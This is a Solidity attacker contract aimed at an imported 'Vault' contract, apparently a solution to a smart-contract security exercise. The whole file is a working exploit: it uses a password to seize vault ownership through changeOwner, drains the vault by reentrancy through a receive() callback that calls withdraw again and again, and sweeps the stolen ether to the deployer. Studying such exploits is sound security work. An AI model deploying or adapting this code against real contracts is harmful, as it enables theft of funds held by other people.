// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public amount;
    address public owner;
    constructor(Vault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    function takeoverAndOpen(bytes32 pwd) external{
        (bool success, ) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", pwd, address(this)));
        require(success, "Failed to change owner");
        vault.openWithdraw();
    }

    function attack(uint256 _amount) external payable {
        amount = _amount;
        vault.deposite{value: _amount}();
        vault.withdraw();
    }

    receive() external payable {
        if(address(vault).balance >= amount){
            vault.withdraw();
        }
    }

    function sweep() external {
        payable(owner).transfer(address(this).balance);
    }
}